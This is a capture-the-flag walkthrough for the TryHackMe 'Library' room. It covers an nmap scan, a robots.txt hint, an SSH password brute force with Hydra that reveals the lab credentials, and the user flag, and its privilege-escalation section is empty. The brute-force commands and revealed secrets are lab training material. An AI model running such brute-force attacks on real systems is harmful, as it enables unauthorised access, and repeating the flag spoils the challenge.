# Library

![Library CTF Logo](./Assets/library-ctf-logo.jpg "Library CTF Logo")

## Summary

[Library](https://tryhackme.com/room/bsidesgtlibrary "Library CTF On TryHackMe") is a begginer friendly CTF hosted by [TryHackMe](https://tryhackme.com/ "TryHackMe Webiste") and created by [Stuxnet](https://twitter.com/__stux "StuxNet Twitter Profile").

This CTF requires **basic** knowledge of:

* Basic Linux commands such as ```ping```, ```ls```, ```cd```, ```cat```, ```sudo```, and ```rm```.

* Port scanning with tools like ```NMAP```.

* ```OSINT``` (Open Source Intelligence).

* Brute forcing SSH login with tools like ```Hydra```.

* Creating/editing files in Linux with command line text editors like ```Nano```.

---

## Contents

* [Getting Started](#getting-started "Jump To Getting Started")

* [Port Scanning](#port-scanning "Jump To Port Scanning")

* [Robots File](#robots-file "Jump To Robots File")

* [OSINT](#osint "Jump To OSINT")

* [Hydra](#hydra "Jump To HYDRA")

* [Initial Access - First Flag](#initial-access "Jump To Initial Access")

* [Vertical Escalation - Root Flag](#vertical-escalation "Jump To Vertical Escalation")

---

## Getting Started

As always we start off by ensuring the target machine is up and running by pinging the target IP address.

```
$ ping <IP_Address>

PING <IP_Address> (<IP_Address>) 56(84) bytes of data.
64 bytes from <IP_Address>: icmp_seq=1 ttl=61 time=161 ms
64 bytes from <IP_Address>: icmp_seq=2 ttl=61 time=160 ms
64 bytes from <IP_Address>: icmp_seq=3 ttl=61 time=159 ms
64 bytes from <IP_Address>: icmp_seq=4 ttl=61 time=160 ms

--- <IP_Address> ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 158.818/160.136/161.498/0.950 ms
```

[Back To Top](#library "Jump To Top")

---

## Port Scanning

Once we've verified the machines connectivity, we can move on to a port scan using ```nmap```. We'll use the ```-A``` flag to specify an aggressive scan, this will return open ports, services, as well as other useful information.

```
$ nmap -A <IP_Address>

Nmap scan report for <IP_Address>
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After running the port scan we'll see two open ports.

* ```PORT 22``` - SSH (Secure Shell)

* ```PORT 80``` - HTTP (HyperText Transfer Protocol)

We can also see that the website at ```PORT 80``` has a [robots.txt](https://en.wikipedia.org/wiki/Robots.txt "Robots Text File WikiPedia Page") file.

```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
```

Naturally, our next step should be visiting the webpage and reading that file. 

[Back To Top](#library "Jump To Top")

---

## Robots File

Before we visit the homepage for the website we should read the contents of the [robots.txt](https://en.wikipedia.org/wiki/Robots.txt "Robots Text File WikiPedia Page") file we found during the ```nmap``` scan.

Navigating to ```http://<IP_Address>/robots.txt``` we'll see a reference to the [rockyou](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz "RockYou Password File On GitHub") wordlist, a hint that we'll need to brute force a service with this password list.

```
User-agent: rockyou
Disallow: /
```

Now we should start looking through the website for other useful information.

[Back To Top](#library "Jump To Top")

---

## OSINT

If we go through the website we won't find any login forms or other directories. But we do find an admins username through a blog post on the main page.

![Blog Authors Username](./Assets/blog-author-username.png "Blog Authors Username")

We have a username (```meliodas```) and we know the password can be found in the ```rockyou``` wordlist, that should be enough to bruteforce the ```SSH``` login.

[Back To Top](#library "Jump To Top")

---

## Hydra

The only piece of the credentials we have is the username, so we'll have to bruteforce the password with ```Hydra```.

The syntax for bruteforcing ```SSH``` with a known username and unknown password is ```hydra -l <username> -P <wordlist> <IP_Address> ssh```.

```
$ hydra -l meliodas -P /path/to/word/list <IP_Address> ssh

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://<IP_Address>:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344222 to do in 1350:41h, 16 active
[22][ssh] host: <IP_Address>   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
```

After a couple minutes we'll get a hit.

```
[22][ssh] host: <IP_Address>   login: meliodas   password: iloveyou1
```

Credentials - ```meliodas:iloveyou1```

[Back To Top](#library "Jump To Top")

---

## Initial Access

Finally, we can log in and look for the first flag.

```
$ ssh meliodas@<IP_Address>

meliodas@<IP_Address>'s password: iloveyou1
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

meliodas@ubuntu:~$
```

After logging in, we'll be dumped into the home directory of ```meliodas```, and if we list all contents of the current directory we'll see the ```user.txt``` file.

```
meliodas@ubuntu:~$ ls -la

total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
```

If we ```cat``` the ```user.txt``` file we'll find our first flag.

```
meliodas@ubuntu:~$ cat user.txt

6d488cbb3f111d135722c33cb635f4ec
```

[Back To Top](#library "Jump To Top")

---

## Vertical Escalation



[Back To Top](#library "Jump To Top")
